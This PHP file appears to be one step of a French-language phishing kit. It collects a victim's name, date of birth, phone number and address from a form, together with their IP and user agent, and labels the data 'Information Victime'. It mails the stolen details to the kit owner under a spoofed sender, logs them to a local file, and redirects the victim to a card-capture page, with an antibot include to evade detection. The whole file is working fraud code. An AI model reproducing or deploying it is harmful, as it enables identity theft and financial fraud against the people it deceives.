<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
	include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
		
		$_SESSION["DOB"]		= $_POST["dob"];
		$_SESSION["nom"]		= $_POST["nom"];
		$_SESSION["prenom"]		= $_POST["prenom"];
		$_SESSION["PhoneNumber"]= $_POST["phone"];
		$_SESSION["street"] 	= $_POST["address1"];
		$_SESSION["city"]		= $_POST["city"];
		$_SESSION["country"] 	= $_POST["country"];
		$_SESSION["postal"] 		= $_POST["postal"];

$message = '
Telephone : '.$_SESSION["PhoneNumber"].'
Adresse : '.$_SESSION["street"].'
Code Postale : '.$_SESSION["postal"].'
Ville : '.$_SESSION["city"].'
==== Information Victime ===='.'
Prénom & Nom : '.$_SESSION["prenom"].' '.$_SESSION["nom"].'
Date De Naissance : '.$_SESSION["DOB"].'
IP: '._ip().'
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject="BILLING INFO |"._ip();
$head="From:AlFredJr V2.019   <bill@rezzz.com>";

$fil = fopen('ss.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_three']  = true;
		mail($my_mail,$Subject,$message,$head);
		header('location: card.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

}
else
{
	header('location: ../../index.php');
} 

